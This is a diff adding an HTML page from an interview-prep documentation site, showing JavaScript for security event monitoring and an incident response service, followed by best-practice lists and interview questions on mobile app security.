+<span class="c1">// Get time range in milliseconds</span>
+<span class="kd">const</span> <span class="nx">getTimeRangeMs</span> <span class="o">=</span> <span class="p">(</span><span class="nx">timeRange</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="kd">const</span> <span class="nx">ranges</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="dl">'</span><span class="s1">1h</span><span class="dl">'</span><span class="p">:</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">,</span>
+    <span class="dl">'</span><span class="s1">24h</span><span class="dl">'</span><span class="p">:</span> <span class="mi">24</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">,</span>
+    <span class="dl">'</span><span class="s1">7d</span><span class="dl">'</span><span class="p">:</span> <span class="mi">7</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">,</span>
+    <span class="dl">'</span><span class="s1">30d</span><span class="dl">'</span><span class="p">:</span> <span class="mi">30</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">,</span>
+  <span class="p">};</span>
+  
+  <span class="k">return</span> <span class="nx">ranges</span><span class="p">[</span><span class="nx">timeRange</span><span class="p">]</span> <span class="o">||</span> <span class="nx">ranges</span><span class="p">[</span><span class="dl">'</span><span class="s1">24h</span><span class="dl">'</span><span class="p">];</span>
+<span class="p">};</span>
+
+<span class="c1">// Store security event</span>
+<span class="kd">const</span> <span class="nx">storeSecurityEvent</span> <span class="o">=</span> <span class="k">async</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="k">try</span> <span class="p">{</span>
+    <span class="c1">// In a real implementation, you would store this in a database</span>
+    <span class="c1">// For now, we'll just keep it in memory</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Storing security event:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">event</span><span class="p">.</span><span class="nx">id</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Error storing security event:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">error</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">};</span>
+
+<span class="c1">// Export security monitoring functions</span>
+<span class="k">export</span> <span class="p">{</span>
+  <span class="nx">createSecurityMonitoringService</span><span class="p">,</span>
+  <span class="nx">checkForAlerts</span><span class="p">,</span>
+  <span class="nx">getRecentEvents</span><span class="p">,</span>
+  <span class="nx">triggerAlert</span><span class="p">,</span>
+  <span class="nx">generateEventId</span><span class="p">,</span>
+  <span class="nx">getTimeRangeMs</span><span class="p">,</span>
+  <span class="nx">storeSecurityEvent</span><span class="p">,</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="-incident-response">🚨 <strong>Incident Response</strong></h2>
+
+<h3 id="incident-response-plan"><strong>Incident Response Plan</strong></h3>
+
+<p><button onclick="copyCode(this)" class="copy-btn">📋 Copy</button></p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Incident response service</span>
+<span class="kd">const</span> <span class="nx">createIncidentResponseService</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="kd">let</span> <span class="nx">activeIncidents</span> <span class="o">=</span> <span class="p">[];</span>
+  <span class="kd">let</span> <span class="nx">incidentTemplates</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="na">dataBreach</span><span class="p">:</span> <span class="p">{</span>
+      <span class="na">severity</span><span class="p">:</span> <span class="dl">'</span><span class="s1">critical</span><span class="dl">'</span><span class="p">,</span>
+      <span class="na">steps</span><span class="p">:</span> <span class="p">[</span>
+        <span class="dl">'</span><span class="s1">Assess the scope of the breach</span><span class="dl">'</span><span class="p">,</span>
+        <span class="dl">'</span><span class="s1">Contain the breach</span><span class="dl">'</span><span class="p">,</span>
+        <span class="dl">'</span><span class="s1">Notify stakeholders</span><span class="dl">'</span><span class="p">,</span>
+        <span class="dl">'</span><span class="s1">Investigate the incident</span><span class="dl">'</span><span class="p">,</span>
+        <span class="dl">'</span><span class="s1">Implement remediation</span><span class="dl">'</span><span class="p">,</span>
+        <span class="dl">'</span><span class="s1">Document lessons learned</span><span class="dl">'</span><span class="p">,</span>
+      <span class="p">],</span>
+    <span class="p">},</span>
+    <span class="na">securityVulnerability</span><span class="p">:</span> <span class="p">{</span>
+      <span class="na">severity</span><span class="p">:</span> <span class="dl">'</span><span class="s1">high</span><span class="dl">'</span><span class="p">,</span>
+      <span class="na">steps</span><span class="p">:</span> <span class="p">[</span>
+        <span class="dl">'</span><span class="s1">Assess the vulnerability</span><span class="dl">'</span><span class="p">,</span>
+        <span class="dl">'</span><span class="s1">Implement temporary mitigation</span><span class="dl">'</span><span class="p">,</span>
+        <span class="dl">'</span><span class="s1">Develop permanent fix</span><span class="dl">'</span><span class="p">,</span>
+        <span class="dl">'</span><span class="s1">Test the fix</span><span class="dl">'</span><span class="p">,</span>
+        <span class="dl">'</span><span class="s1">Deploy the fix</span><span class="dl">'</span><span class="p">,</span>
+        <span class="dl">'</span><span class="s1">Monitor for recurrence</span><span class="dl">'</span><span class="p">,</span>
+      <span class="p">],</span>
+    <span class="p">},</span>
+    <span class="na">unauthorizedAccess</span><span class="p">:</span> <span class="p">{</span>
+      <span class="na">severity</span><span class="p">:</span> <span class="dl">'</span><span class="s1">high</span><span class="dl">'</span><span class="p">,</span>
+      <span class="na">steps</span><span class="p">:</span> <span class="p">[</span>
+        <span class="dl">'</span><span class="s1">Revoke access immediately</span><span class="dl">'</span><span class="p">,</span>
+        <span class="dl">'</span><span class="s1">Investigate the incident</span><span class="dl">'</span><span class="p">,</span>
+        <span class="dl">'</span><span class="s1">Assess data exposure</span><span class="dl">'</span><span class="p">,</span>
+        <span class="dl">'</span><span class="s1">Notify affected users</span><span class="dl">'</span><span class="p">,</span>
+        <span class="dl">'</span><span class="s1">Implement additional security</span><span class="dl">'</span><span class="p">,</span>
+        <span class="dl">'</span><span class="s1">Review access controls</span><span class="dl">'</span><span class="p">,</span>
+      <span class="p">],</span>
+    <span class="p">},</span>
+  <span class="p">};</span>
+  
+  <span class="k">return</span> <span class="p">{</span>
+    <span class="c1">// Create incident</span>
+    <span class="na">createIncident</span><span class="p">:</span> <span class="p">(</span><span class="nx">incidentData</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="k">try</span> <span class="p">{</span>
+        <span class="kd">const</span> <span class="nx">incident</span> <span class="o">=</span> <span class="p">{</span>
+          <span class="na">id</span><span class="p">:</span> <span class="nx">generateIncidentId</span><span class="p">(),</span>
+          <span class="na">timestamp</span><span class="p">:</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">().</span><span class="nx">toISOString</span><span class="p">(),</span>
+          <span class="na">type</span><span class="p">:</span> <span class="nx">incidentData</span><span class="p">.</span><span class="nx">type</span><span class="p">,</span>
+          <span class="na">severity</span><span class="p">:</span> <span class="nx">incidentData</span><span class="p">.</span><span class="nx">severity</span> <span class="o">||</span> <span class="dl">'</span><span class="s1">medium</span><span class="dl">'</span><span class="p">,</span>
+          <span class="na">status</span><span class="p">:</span> <span class="dl">'</span><span class="s1">open</span><span class="dl">'</span><span class="p">,</span>
+          <span class="na">description</span><span class="p">:</span> <span class="nx">incidentData</span><span class="p">.</span><span class="nx">description</span><span class="p">,</span>
+          <span class="na">affectedSystems</span><span class="p">:</span> <span class="nx">incidentData</span><span class="p">.</span><span class="nx">affectedSystems</span> <span class="o">||</span> <span class="p">[],</span>
+          <span class="na">assignedTo</span><span class="p">:</span> <span class="nx">incidentData</span><span class="p">.</span><span class="nx">assignedTo</span> <span class="o">||</span> <span class="kc">null</span><span class="p">,</span>
+          <span class="na">steps</span><span class="p">:</span> <span class="nx">incidentTemplates</span><span class="p">[</span><span class="nx">incidentData</span><span class="p">.</span><span class="nx">type</span><span class="p">]?.</span><span class="nx">steps</span> <span class="o">||</span> <span class="p">[],</span>
+          <span class="na">currentStep</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+          <span class="na">timeline</span><span class="p">:</span> <span class="p">[],</span>
+          <span class="na">resolution</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
+        <span class="p">};</span>
+        
+        <span class="nx">activeIncidents</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">incident</span><span class="p">);</span>
+        
+        <span class="c1">// Log incident creation</span>
+        <span class="nx">logIncidentEvent</span><span class="p">(</span><span class="nx">incident</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span> <span class="dl">'</span><span class="s1">created</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">Incident created</span><span class="dl">'</span><span class="p">);</span>
+        
+        <span class="c1">// Notify stakeholders</span>
+        <span class="nx">notifyStakeholders</span><span class="p">(</span><span class="nx">incident</span><span class="p">);</span>
+        
+        <span class="k">return</span> <span class="nx">incident</span><span class="p">.</span><span class="nx">id</span><span class="p">;</span>
+      <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Error creating incident:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">error</span><span class="p">);</span>
+        <span class="k">throw</span> <span class="nx">error</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">},</span>
+    
+    <span class="c1">// Update incident</span>
+    <span class="na">updateIncident</span><span class="p">:</span> <span class="p">(</span><span class="nx">incidentId</span><span class="p">,</span> <span class="nx">updates</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="k">try</span> <span class="p">{</span>
+        <span class="kd">const</span> <span class="nx">incident</span> <span class="o">=</span> <span class="nx">activeIncidents</span><span class="p">.</span><span class="nx">find</span><span class="p">(</span><span class="nx">inc</span> <span class="o">=&gt;</span> <span class="nx">inc</span><span class="p">.</span><span class="nx">id</span> <span class="o">===</span> <span class="nx">incidentId</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">incident</span><span class="p">)</span> <span class="p">{</span>
+          <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Incident not found</span><span class="dl">'</span><span class="p">);</span>
+        <span class="p">}</span>
+        
+        <span class="c1">// Update incident</span>
+        <span class="nb">Object</span><span class="p">.</span><span class="nx">assign</span><span class="p">(</span><span class="nx">incident</span><span class="p">,</span> <span class="nx">updates</span><span class="p">);</span>
+        
+        <span class="c1">// Log update</span>
+        <span class="nx">logIncidentEvent</span><span class="p">(</span><span class="nx">incidentId</span><span class="p">,</span> <span class="dl">'</span><span class="s1">updated</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">Incident updated</span><span class="dl">'</span><span class="p">);</span>
+        
+        <span class="k">return</span> <span class="nx">incident</span><span class="p">;</span>
+      <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Error updating incident:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">error</span><span class="p">);</span>
+        <span class="k">throw</span> <span class="nx">error</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">},</span>
+    
+    <span class="c1">// Resolve incident</span>
+    <span class="na">resolveIncident</span><span class="p">:</span> <span class="p">(</span><span class="nx">incidentId</span><span class="p">,</span> <span class="nx">resolution</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="k">try</span> <span class="p">{</span>
+        <span class="kd">const</span> <span class="nx">incident</span> <span class="o">=</span> <span class="nx">activeIncidents</span><span class="p">.</span><span class="nx">find</span><span class="p">(</span><span class="nx">inc</span> <span class="o">=&gt;</span> <span class="nx">inc</span><span class="p">.</span><span class="nx">id</span> <span class="o">===</span> <span class="nx">incidentId</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">incident</span><span class="p">)</span> <span class="p">{</span>
+          <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Incident not found</span><span class="dl">'</span><span class="p">);</span>
+        <span class="p">}</span>
+        
+        <span class="nx">incident</span><span class="p">.</span><span class="nx">status</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">resolved</span><span class="dl">'</span><span class="p">;</span>
+        <span class="nx">incident</span><span class="p">.</span><span class="nx">resolution</span> <span class="o">=</span> <span class="nx">resolution</span><span class="p">;</span>
+        <span class="nx">incident</span><span class="p">.</span><span class="nx">resolvedAt</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">().</span><span class="nx">toISOString</span><span class="p">();</span>
+        
+        <span class="c1">// Log resolution</span>
+        <span class="nx">logIncidentEvent</span><span class="p">(</span><span class="nx">incidentId</span><span class="p">,</span> <span class="dl">'</span><span class="s1">resolved</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">Incident resolved</span><span class="dl">'</span><span class="p">);</span>
+        
+        <span class="c1">// Notify stakeholders</span>
+        <span class="nx">notifyStakeholders</span><span class="p">(</span><span class="nx">incident</span><span class="p">);</span>
+        
+        <span class="k">return</span> <span class="nx">incident</span><span class="p">;</span>
+      <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Error resolving incident:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">error</span><span class="p">);</span>
+        <span class="k">throw</span> <span class="nx">error</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">},</span>
+    
+    <span class="c1">// Get incident</span>
+    <span class="na">getIncident</span><span class="p">:</span> <span class="p">(</span><span class="nx">incidentId</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="nx">activeIncidents</span><span class="p">.</span><span class="nx">find</span><span class="p">(</span><span class="nx">inc</span> <span class="o">=&gt;</span> <span class="nx">inc</span><span class="p">.</span><span class="nx">id</span> <span class="o">===</span> <span class="nx">incidentId</span><span class="p">);</span>
+    <span class="p">},</span>
+    
+    <span class="c1">// Get all incidents</span>
+    <span class="na">getAllIncidents</span><span class="p">:</span> <span class="p">(</span><span class="nx">filter</span> <span class="o">=</span> <span class="p">{})</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="kd">let</span> <span class="nx">filteredIncidents</span> <span class="o">=</span> <span class="p">[...</span><span class="nx">activeIncidents</span><span class="p">];</span>
+      
+      <span class="k">if</span> <span class="p">(</span><span class="nx">filter</span><span class="p">.</span><span class="nx">status</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">filteredIncidents</span> <span class="o">=</span> <span class="nx">filteredIncidents</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="nx">inc</span> <span class="o">=&gt;</span> <span class="nx">inc</span><span class="p">.</span><span class="nx">status</span> <span class="o">===</span> <span class="nx">filter</span><span class="p">.</span><span class="nx">status</span><span class="p">);</span>
+      <span class="p">}</span>
+      
+      <span class="k">if</span> <span class="p">(</span><span class="nx">filter</span><span class="p">.</span><span class="nx">severity</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">filteredIncidents</span> <span class="o">=</span> <span class="nx">filteredIncidents</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="nx">inc</span> <span class="o">=&gt;</span> <span class="nx">inc</span><span class="p">.</span><span class="nx">severity</span> <span class="o">===</span> <span class="nx">filter</span><span class="p">.</span><span class="nx">severity</span><span class="p">);</span>
+      <span class="p">}</span>
+      
+      <span class="k">if</span> <span class="p">(</span><span class="nx">filter</span><span class="p">.</span><span class="nx">type</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">filteredIncidents</span> <span class="o">=</span> <span class="nx">filteredIncidents</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="nx">inc</span> <span class="o">=&gt;</span> <span class="nx">inc</span><span class="p">.</span><span class="nx">type</span> <span class="o">===</span> <span class="nx">filter</span><span class="p">.</span><span class="nx">type</span><span class="p">);</span>
+      <span class="p">}</span>
+      
+      <span class="k">return</span> <span class="nx">filteredIncidents</span><span class="p">.</span><span class="nx">sort</span><span class="p">((</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="o">=&gt;</span> 
+        <span class="k">new</span> <span class="nb">Date</span><span class="p">(</span><span class="nx">b</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">)</span> <span class="o">-</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">)</span>
+      <span class="p">);</span>
+    <span class="p">},</span>
+    
+    <span class="c1">// Get incident metrics</span>
+    <span class="na">getIncidentMetrics</span><span class="p">:</span> <span class="p">(</span><span class="nx">timeRange</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">30d</span><span class="dl">'</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="kd">const</span> <span class="nx">now</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">();</span>
+      <span class="kd">const</span> <span class="nx">startTime</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">(</span><span class="nx">now</span><span class="p">.</span><span class="nx">getTime</span><span class="p">()</span> <span class="o">-</span> <span class="nx">getTimeRangeMs</span><span class="p">(</span><span class="nx">timeRange</span><span class="p">));</span>
+      
+      <span class="kd">const</span> <span class="nx">incidentsInRange</span> <span class="o">=</span> <span class="nx">activeIncidents</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="nx">incident</span> <span class="o">=&gt;</span> 
+        <span class="k">new</span> <span class="nb">Date</span><span class="p">(</span><span class="nx">incident</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="nx">startTime</span>
+      <span class="p">);</span>
+      
+      <span class="kd">const</span> <span class="nx">metrics</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="na">totalIncidents</span><span class="p">:</span> <span class="nx">incidentsInRange</span><span class="p">.</span><span class="nx">length</span><span class="p">,</span>
+        <span class="na">incidentsByType</span><span class="p">:</span> <span class="p">{},</span>
+        <span class="na">incidentsBySeverity</span><span class="p">:</span> <span class="p">{},</span>
+        <span class="na">incidentsByStatus</span><span class="p">:</span> <span class="p">{},</span>
+        <span class="na">averageResolutionTime</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+        <span class="na">resolutionRate</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+      <span class="p">};</span>
+      
+      <span class="c1">// Calculate metrics</span>
+      <span class="nx">incidentsInRange</span><span class="p">.</span><span class="nx">forEach</span><span class="p">(</span><span class="nx">incident</span> <span class="o">=&gt;</span> <span class="p">{</span>
+        <span class="c1">// Incidents by type</span>
+        <span class="nx">metrics</span><span class="p">.</span><span class="nx">incidentsByType</span><span class="p">[</span><span class="nx">incident</span><span class="p">.</span><span class="nx">type</span><span class="p">]</span> <span class="o">=</span> 
+          <span class="p">(</span><span class="nx">metrics</span><span class="p">.</span><span class="nx">incidentsByType</span><span class="p">[</span><span class="nx">incident</span><span class="p">.</span><span class="nx">type</span><span class="p">]</span> <span class="o">||</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+        
+        <span class="c1">// Incidents by severity</span>
+        <span class="nx">metrics</span><span class="p">.</span><span class="nx">incidentsBySeverity</span><span class="p">[</span><span class="nx">incident</span><span class="p">.</span><span class="nx">severity</span><span class="p">]</span> <span class="o">=</span> 
+          <span class="p">(</span><span class="nx">metrics</span><span class="p">.</span><span class="nx">incidentsBySeverity</span><span class="p">[</span><span class="nx">incident</span><span class="p">.</span><span class="nx">severity</span><span class="p">]</span> <span class="o">||</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+        
+        <span class="c1">// Incidents by status</span>
+        <span class="nx">metrics</span><span class="p">.</span><span class="nx">incidentsByStatus</span><span class="p">[</span><span class="nx">incident</span><span class="p">.</span><span class="nx">status</span><span class="p">]</span> <span class="o">=</span> 
+          <span class="p">(</span><span class="nx">metrics</span><span class="p">.</span><span class="nx">incidentsByStatus</span><span class="p">[</span><span class="nx">incident</span><span class="p">.</span><span class="nx">status</span><span class="p">]</span> <span class="o">||</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+      <span class="p">});</span>
+      
+      <span class="c1">// Calculate average resolution time</span>
+      <span class="kd">const</span> <span class="nx">resolvedIncidents</span> <span class="o">=</span> <span class="nx">incidentsInRange</span><span class="p">.</span><span class="nx">filter</span><span class="p">(</span><span class="nx">inc</span> <span class="o">=&gt;</span> <span class="nx">inc</span><span class="p">.</span><span class="nx">status</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">resolved</span><span class="dl">'</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="nx">resolvedIncidents</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">const</span> <span class="nx">totalResolutionTime</span> <span class="o">=</span> <span class="nx">resolvedIncidents</span><span class="p">.</span><span class="nx">reduce</span><span class="p">((</span><span class="nx">total</span><span class="p">,</span> <span class="nx">inc</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+          <span class="kd">const</span> <span class="nx">resolutionTime</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">(</span><span class="nx">inc</span><span class="p">.</span><span class="nx">resolvedAt</span><span class="p">)</span> <span class="o">-</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">(</span><span class="nx">inc</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">);</span>
+          <span class="k">return</span> <span class="nx">total</span> <span class="o">+</span> <span class="nx">resolutionTime</span><span class="p">;</span>
+        <span class="p">},</span> <span class="mi">0</span><span class="p">);</span>
+        
+        <span class="nx">metrics</span><span class="p">.</span><span class="nx">averageResolutionTime</span> <span class="o">=</span> <span class="nx">totalResolutionTime</span> <span class="o">/</span> <span class="nx">resolvedIncidents</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
+      <span class="p">}</span>
+      
+      <span class="c1">// Calculate resolution rate</span>
+      <span class="nx">metrics</span><span class="p">.</span><span class="nx">resolutionRate</span> <span class="o">=</span> <span class="nx">resolvedIncidents</span><span class="p">.</span><span class="nx">length</span> <span class="o">/</span> <span class="nx">incidentsInRange</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
+      
+      <span class="k">return</span> <span class="nx">metrics</span><span class="p">;</span>
+    <span class="p">},</span>
+  <span class="p">};</span>
+<span class="p">};</span>
+
+<span class="c1">// Log incident event</span>
+<span class="kd">const</span> <span class="nx">logIncidentEvent</span> <span class="o">=</span> <span class="p">(</span><span class="nx">incidentId</span><span class="p">,</span> <span class="nx">action</span><span class="p">,</span> <span class="nx">description</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="kd">const</span> <span class="nx">event</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="nx">incidentId</span><span class="p">,</span>
+    <span class="nx">action</span><span class="p">,</span>
+    <span class="nx">description</span><span class="p">,</span>
+    <span class="na">timestamp</span><span class="p">:</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">().</span><span class="nx">toISOString</span><span class="p">(),</span>
+  <span class="p">};</span>
+  
+  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Incident Event:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">event</span><span class="p">));</span>
+<span class="p">};</span>
+
+<span class="c1">// Notify stakeholders</span>
+<span class="kd">const</span> <span class="nx">notifyStakeholders</span> <span class="o">=</span> <span class="p">(</span><span class="nx">incident</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="kd">const</span> <span class="nx">notification</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="na">incidentId</span><span class="p">:</span> <span class="nx">incident</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span>
+    <span class="na">type</span><span class="p">:</span> <span class="nx">incident</span><span class="p">.</span><span class="nx">type</span><span class="p">,</span>
+    <span class="na">severity</span><span class="p">:</span> <span class="nx">incident</span><span class="p">.</span><span class="nx">severity</span><span class="p">,</span>
+    <span class="na">status</span><span class="p">:</span> <span class="nx">incident</span><span class="p">.</span><span class="nx">status</span><span class="p">,</span>
+    <span class="na">description</span><span class="p">:</span> <span class="nx">incident</span><span class="p">.</span><span class="nx">description</span><span class="p">,</span>
+    <span class="na">timestamp</span><span class="p">:</span> <span class="nx">incident</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">,</span>
+  <span class="p">};</span>
+  
+  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Stakeholder Notification:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">notification</span><span class="p">));</span>
+  
+  <span class="c1">// In a real implementation, you would send notifications via email, SMS, etc.</span>
+<span class="p">};</span>
+
+<span class="c1">// Generate incident ID</span>
+<span class="kd">const</span> <span class="nx">generateIncidentId</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="dl">'</span><span class="s1">INC-</span><span class="dl">'</span> <span class="o">+</span> <span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">().</span><span class="nx">toString</span><span class="p">(</span><span class="mi">36</span><span class="p">).</span><span class="nx">toUpperCase</span><span class="p">();</span>
+<span class="p">};</span>
+
+<span class="c1">// Export incident response functions</span>
+<span class="k">export</span> <span class="p">{</span>
+  <span class="nx">createIncidentResponseService</span><span class="p">,</span>
+  <span class="nx">logIncidentEvent</span><span class="p">,</span>
+  <span class="nx">notifyStakeholders</span><span class="p">,</span>
+  <span class="nx">generateIncidentId</span><span class="p">,</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="-best-practices">🎯 <strong>Best Practices</strong></h2>
+
+<h3 id="1-security-implementation"><strong>1. Security Implementation</strong></h3>
+<ul>
+  <li>Implement defense in depth</li>
+  <li>Use secure coding practices</li>
+  <li>Regular security testing</li>
+  <li>Continuous monitoring</li>
+</ul>
+
+<h3 id="2-vulnerability-management"><strong>2. Vulnerability Management</strong></h3>
+<ul>
+  <li>Regular security assessments</li>
+  <li>Automated vulnerability scanning</li>
+  <li>Penetration testing</li>
+  <li>Security code reviews</li>
+</ul>
+
+<h3 id="3-incident-response"><strong>3. Incident Response</strong></h3>
+<ul>
+  <li>Develop incident response plan</li>
+  <li>Regular incident response drills</li>
+  <li>Post-incident reviews</li>
+  <li>Continuous improvement</li>
+</ul>
+
+<hr />
+
+<h2 id="-interview-questions">❓ <strong>Interview Questions</strong></h2>
+
+<h3 id="basic-questions"><strong>Basic Questions</strong></h3>
+<ol>
+  <li><strong>What are the key security best practices for mobile apps?</strong></li>
+  <li><strong>How do you implement security monitoring?</strong></li>
+  <li><strong>What is an incident response plan?</strong></li>
+</ol>
+
+<h3 id="advanced-questions"><strong>Advanced Questions</strong></h3>
+<ol>
+  <li><strong>How would you design a security framework for a mobile app?</strong></li>
+  <li><strong>Explain the vulnerability assessment process.</strong></li>
+  <li><strong>How do you handle security incidents?</strong></li>
+</ol>
+
+<h3 id="practical-questions"><strong>Practical Questions</strong></h3>
+<ol>
+  <li><strong>Implement a security assessment system.</strong></li>
+  <li><strong>Create an incident response plan.</strong></li>
+  <li><strong>Set up security monitoring and alerting.</strong></li>
+</ol>
+
+<hr />
+
+<h2 id="-navigation">🧭 Navigation</h2>
+
+<div class="navigation">
+    <a href="./03-Data-Encryption.md" class="nav-link prev">⬅️ Previous: Data Encryption</a>
+    <a href="../12-Accessibility-Internationalization/01-Accessibility-Basics.md" class="nav-link next">Next: Accessibility Basics ➡️</a>
+</div>
+
+<hr />
+
+<script src="../../common-scripts.js"></script>
+
+<p><em>Last updated: December 2024</em></p>
+
+        </main>
+        
+        <footer style="margin-top: 40px; padding-top: 20px; border-top: 1px solid #ecf0f1; color: #666; text-align: center;">
+            <p>Interview Prep Documentation - Built with Jekyll</p>
+        </footer>
+    </div>
+</body>
+</html>
